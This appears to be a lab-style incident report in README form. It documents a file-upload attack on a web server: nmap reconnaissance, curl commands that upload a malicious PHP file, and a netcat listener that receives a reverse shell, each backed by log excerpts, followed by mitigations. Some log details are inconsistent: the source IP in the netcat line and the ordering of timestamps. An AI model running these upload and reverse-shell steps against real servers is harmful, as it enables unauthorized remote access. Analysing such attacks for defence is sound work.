# 🛡️ Web Attack Analysis Report

**Date:** 23/11/2025\
**Format:** GitHub-Friendly README (Markdown)

------------------------------------------------------------------------

## 📌 Overview

This report documents a full attack flow against a vulnerable web
server.\
The attacker exploited an insecure file upload feature to upload a
malicious PHP file (`reverse_proxy.php`) and subsequently gained remote
shell access.

------------------------------------------------------------------------

## 🖥️ Environment Details

  Component                       Value
  ------------------------------- -------------------------------
  **Attacker IP**                 `10.0.0.50`
  **Web Server IP**               `10.0.0.20`
  **Upload Endpoint**             `http://10.0.0.20/upload.php`
  **Upload Directory (Server)**   `/var/www/html/uploads/`
  **Malicious File Name**         `reverse_proxy.php`

------------------------------------------------------------------------

## 🔍 Stage 1 --- Reconnaissance (Nmap Scanning)

The attacker scanned the server for open ports and available services:

``` bash
nmap -sV -p 1-1000 10.0.0.20
nmap -sV -p 80,443 10.0.0.20
```

### 📄 Evidence (Apache access logs)

    10.0.0.50 - - [23/Nov/2025:14:01:09 +0200] "GET / HTTP/1.1" 200 512 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; http-enum)"
    10.0.0.50 - - [23/Nov/2025:14:01:09 +0200] "GET /robots.txt HTTP/1.1" 404 298 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; http-enum)"
    10.0.0.50 - - [23/Nov/2025:14:01:12 +0200] "GET /admin/ HTTP/1.1" 403 420 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; http-enum)"

------------------------------------------------------------------------

## 📂 Stage 2 --- Exploring the Web Application (cURL Enumeration)

The attacker probed the upload functionality:

``` bash
curl -I http://10.0.0.20/
curl http://10.0.0.20/upload.php
curl -F 'file=@reverse_proxy.php' http://10.0.0.20/upload.php
curl http://10.0.0.20/uploads/reverse_proxy.php?check=1
```

### 📄 Evidence (Apache access logs)

    10.0.0.50 - - [23/Nov/2025:14:01:35 +0200] "GET /upload.php HTTP/1.1" 200 1337 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    10.0.0.50 - - [23/Nov/2025:14:02:01 +0200] "POST /upload.php HTTP/1.1" 200 1542 "http://10.0.0.20/upload.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    10.0.0.50 - - [23/Nov/2025:14:02:03 +0200] "GET /uploads/reverse_proxy.php HTTP/1.1" 200 412 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    10.0.0.50 - - [23/Nov/2025:14:02:05 +0200] "GET /uploads/reverse_proxy.php?check=1 HTTP/1.1" 200 418 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

------------------------------------------------------------------------

## 📤 Stage 3 --- Successful Malicious File Upload

### 📄 Evidence (web_error.log)

    [Sun Nov 23 14:02:01.998877 2025] [php7:info] [pid 1246] [client 10.0.0.50:51522] File upload successful: /var/www/html/uploads/reverse_proxy.php (size: 1841 bytes), referer: http://10.0.0.20/upload.php

The logs confirm that the malicious PHP file was successfully uploaded.

------------------------------------------------------------------------

## 🎧 Stage 4 --- Establishing Reverse Connection (Netcat Listener)

On the attacker's machine:

``` bash
nc -lvnp 4444
```

When the attacker accessed the malicious PHP file, a connection was
initiated:

    10.0.0.50 - - [23/Nov/2025:14:04:12 +0200] "GET /uploads/reverse_proxy.php?status=poll HTTP/1.1" 200 432 "-" "curl/7.81.0"

------------------------------------------------------------------------

## 🔥 Stage 5 --- Firewall Evidence of Reverse Shell Traffic

### 📄 Firewall logs

    Nov 23 14:02:29 attack-ws kernel: [25432.112233] IN=eth0 OUT= MAC=52:54:00:aa:bb:cc:52:54:00:11:22:33:08:00 SRC=10.0.0.20 DST=10.0.0.50 LEN=60 TOS=0x00 PREC=0x00 TTL=63 ID=54321 DF PROTO=TCP SPT=51544 DPT=4444 WINDOW=64240 RES=0x00 SYN URGP=0

    Nov 23 14:02:29 attack-ws kernel: [25432.112499] IN=eth0 OUT= MAC=52:54:00:aa:bb:cc:52:54:00:11:22:33:08:00 SRC=10.0.0.50 DST=10.0.0.20 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12345 DF PROTO=TCP SPT=4444 DPT=51544 WINDOW=64240 RES=0x00 SYN,ACK URGP=0

### 📄 Netcat confirmation

    Nov 23 14:02:30 attack-ws nc[1777]: Connection from 10.0.0.50 4444 received

This confirms that a reverse shell connection was successfully
established.

------------------------------------------------------------------------

## 🧩 Summary of the Attack

1.  **Reconnaissance:** Attacker scanned open ports and directories.\
2.  **Enumeration:** Identified vulnerable upload functionality.\
3.  **Exploitation:** Uploaded `reverse_proxy.php` via insecure upload
    form.\
4.  **Execution:** Triggered the uploaded file to establish a reverse
    connection.\
5.  **Command & Control:** Attacker successfully received a remote
    shell.

------------------------------------------------------------------------

## 🛠️ Recommended Mitigations

-   Implement strict file validation (MIME/type/extension checking).\
-   Disable execution rights in upload directories.\
-   Use Web Application Firewall (WAF).\
-   Limit allowed HTTP methods.\
-   Patch and update PHP and server components.\
-   Enable detailed logging and real-time monitoring.

------------------------------------------------------------------------

**End of Report**
